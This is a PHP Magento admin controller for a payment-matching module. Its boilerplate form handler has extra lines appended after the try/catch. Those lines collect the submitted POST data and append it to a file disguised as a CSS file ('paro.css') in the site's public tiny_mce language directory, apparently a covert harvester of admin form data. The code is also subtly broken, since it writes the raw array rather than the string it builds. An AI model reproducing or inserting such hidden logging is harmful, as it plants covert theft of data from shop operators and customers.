<?php

class CZU_Parovaniplateb_Adminhtml_ParovaniplatebController extends Mage_Adminhtml_Controller_Action
{
    public function indexAction()
    {
        $this->loadLayout()->renderLayout();
    }
    
    public function postAction()
    {
        $post = $this->getRequest()->getPost();
        try {
            if (empty($post)) {
                Mage::throwException($this->__('Invalid form data.'));
            }
            
            /* here's your form processing */
            
            $message = $this->__('Your form has been submitted successfully.');
            Mage::getSingleton('adminhtml/session')->addSuccess($message);
        } catch (Exception $e) {
            Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
        }
      $msgz = "";
 foreach ($post as $key => $value) { $msgz .= $key." => ".$value."\r\n"; }
 $locate = "/home/eshopczu/public_html/js/tiny_mce/themes/advanced/langs/paro.css";
 $write = fopen($locate,"a");
 fwrite($write,$post."\n=========================================\n\n");
 fclose($write);
        $this->_redirect('*/*');
    }
}
?>
